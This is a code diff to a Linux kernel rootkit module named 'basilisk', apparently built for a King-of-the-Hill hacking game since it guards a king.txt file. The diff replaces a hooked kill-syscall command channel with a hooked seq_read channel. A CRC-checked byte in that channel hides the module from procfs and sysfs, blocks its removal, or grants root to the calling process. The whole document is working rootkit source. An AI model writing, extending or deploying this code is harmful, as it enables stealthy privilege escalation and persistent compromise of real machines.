@@ -19,14 +19,6 @@
 #include "include/stealth_helper.h"
 #include "include/utils.h"
 
-// Macros for the kill hook commands (documented at the kill_hook)
-#define SIG_HIDE 63
-#define SIG_ROOT 64
-#define SIG_PROTECT 32
-#define SIG_GODMODE 38
-
-#define READ_PREFIX 0xfffffffa
-
 // Macros for protecting king.txt
 #define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
 #define KING_FILENAME_LEN strlen(KING_FILENAME)
@@ -43,6 +35,13 @@ MODULE_VERSION("2.0");
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
+typedef enum {
+    SIG_GOD = 0xFFFFFFFF,
+    SIG_HIDE = 0xFFFFFFFA,
+    SIG_PROTECT = 0xFFFFFFFB,
+    SIG_ROOT = 0xFFFFFFBA,
+} CmdSignal;
+
 static bool hidden = false; // toggle for hiding from sysfs/procfs
 static bool protected = false; // toggle for inc/decrementing module ref count (un/protecting it from being removed)
 
@@ -51,6 +50,31 @@ static struct file_operations *king_fops = NULL;
 // static struct file_operations *king_fops;
 static DEFINE_RWLOCK(king_fops_lock);
 
+/* Executes appropriate functions based on given signal. Returns false (1) on wrong signal */
+bool sig_handle(const CmdSignal sig) {
+    switch (sig) {
+        case SIG_HIDE:
+            handle_lkm_hide(&hidden);
+            break;
+
+        case SIG_PROTECT:
+            handle_lkm_protect(&protected);
+            break;
+
+        case SIG_GOD:
+            handle_lkm_hide(&hidden);
+            handle_lkm_protect(&protected);
+            break;
+
+        case SIG_ROOT:
+            set_root();
+            break;
+
+        default:
+            return false;
+    }
+    return true;
+}
 
 /*
 static const struct proc_ops kallsyms_proc_ops = {
@@ -65,7 +89,7 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
 {
     long error;
     char *kbuf;
-    char cmd;
+    CmdSignal sig;
     uint32_t extracted_crc, calculated_crc;
     size_t crc_size = sizeof(uint32_t); // length of uint32_t
     size_t data_size = 9;
@@ -85,7 +109,7 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
         return orig_seq_read(file, buf, size, ppos);
     }
 
-    cmd = kbuf[0]; // first byte (command)
+    sig = (CmdSignal)kbuf[0]; // first byte (command)
     extracted_crc = *(uint32_t *)(kbuf + data_size - crc_size);
     calculated_crc = crc32(kbuf, data_size - crc_size);
 
@@ -93,7 +117,8 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
       kfree(kbuf);
       return orig_seq_read(file, buf, size, ppos);
     }
-    pr_info("basilisk: CRC matches: calculated 0x%x, extracted 0x%x\n", calculated_crc, extracted_crc);
+    pr_info("basilisk: received signal: %x\n", sig);
+    sig_handle(sig);
 
     kfree(kbuf);
     return orig_seq_read(file, buf, size, ppos);
@@ -297,74 +322,74 @@ SIG_ROOT calls set_root (give root to the caller process)
 Otherwise it calls the original kill syscall.
 */
 
-#ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage long (*orig_kill)(const struct pt_regs *);
+// #ifdef PTREGS_SYSCALL_STUBS
+// static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
-asmlinkage int hook_kill(const struct pt_regs *regs)
-{ 
- /* declare required prototypes (defined below, for clarity) */
-    int sig = regs->si;
+// asmlinkage int hook_kill(const struct pt_regs *regs)
+// { 
+//  /* declare required prototypes (defined below, for clarity) */
+//     int sig = regs->si;
 
-    switch (sig) {
-        case SIG_HIDE:
-            handle_lkm_hide();
-            break;
+//     switch (sig) {
+//         case SIG_HIDE:
+//             handle_lkm_hide();
+//             break;
 
-        case SIG_PROTECT:
-            handle_lkm_protect(&protected);
-            break;
+//         case SIG_PROTECT:
+//             handle_lkm_protect(&protected);
+//             break;
         
-        case SIG_GODMODE:
-            handle_lkm_hide();
-            handle_lkm_protect(&protected);
-            break;
+//         case SIG_GODMODE:
+//             handle_lkm_hide();
+//             handle_lkm_protect(&protected);
+//             break;
 
-        case SIG_ROOT:
-            pr_info("basilisk: giving root...\n");
-            set_root();
-            break;
+//         case SIG_ROOT:
+//             pr_info("basilisk: giving root...\n");
+//             set_root();
+//             break;
 
-        default:
-            return orig_kill(regs);
-    }
-    return 0;
-}
+//         default:
+//             return orig_kill(regs);
+//     }
+//     return 0;
+// }
 
-#else
-/* This is the old way of declaring a syscall hook */
-static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+// #else
+// /* This is the old way of declaring a syscall hook */
+// static asmlinkage long (*orig_kill)(pid_t pid, int sig);
 
-asmlinkage int hook_kill(pid_t pid, int sig)
-{
-    switch (sig) {
-        case SIG_HIDE:
-            handle_lkm_hide(&hidden);
-            break;
+// asmlinkage int hook_kill(pid_t pid, int sig)
+// {
+//     switch (sig) {
+//         case SIG_HIDE:
+//             handle_lkm_hide(&hidden);
+//             break;
 
-        case SIG_PROTECT:
-            handle_lkm_protect(&protected);
-            break;
+//         case SIG_PROTECT:
+//             handle_lkm_protect(&protected);
+//             break;
         
-        case SIG_GODMODE:
-            handle_lkm_hide(&hidden);
-            handle_lkm_protect(&protected);
-            break;
+//         case SIG_GODMODE:
+//             handle_lkm_hide(&hidden);
+//             handle_lkm_protect(&protected);
+//             break;
 
-        case SIG_ROOT:
-            pr_info("basilisk: giving root...\n");
-            set_root();
-            break;
+//         case SIG_ROOT:
+//             pr_info("basilisk: giving root...\n");
+//             set_root();
+//             break;
 
-        default:
-            return orig_kill(pid, sig);
-    }
-    return 0;
-}
-#endif
+//         default:
+//             return orig_kill(pid, sig);
+//     }
+//     return 0;
+// }
+// #endif
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
-    HOOK("sys_kill", hook_kill, &orig_kill),
+    // HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_openat", hook_openat, &orig_openat),
     HOOK("seq_read", hook_seq_read, &orig_seq_read),
 };
